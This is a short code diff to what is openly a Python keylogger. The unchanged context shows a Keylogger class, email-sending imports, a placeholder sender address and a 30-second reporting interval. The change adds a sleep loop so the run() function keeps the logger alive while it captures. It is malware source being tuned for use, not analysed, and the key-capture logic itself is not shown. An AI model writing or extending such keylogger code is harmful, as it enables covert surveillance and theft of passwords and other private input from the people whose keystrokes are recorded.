@@ -7,6 +7,7 @@ from threading import Timer
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+import time 
 
 SEND_REPORT_EVERY = 30 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "email@provider.tld"
@@ -20,8 +21,10 @@ def run(**args):
     # (and then send it using your favorite method)
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     keylogger.start()
-    if return_msg != "":
-        return return_msg
+    while True:
+        time.sleep(30)
+        if return_msg != "":
+            return return_msg
 
 class Keylogger:
     def __init__(self, interval, report_method="file"):
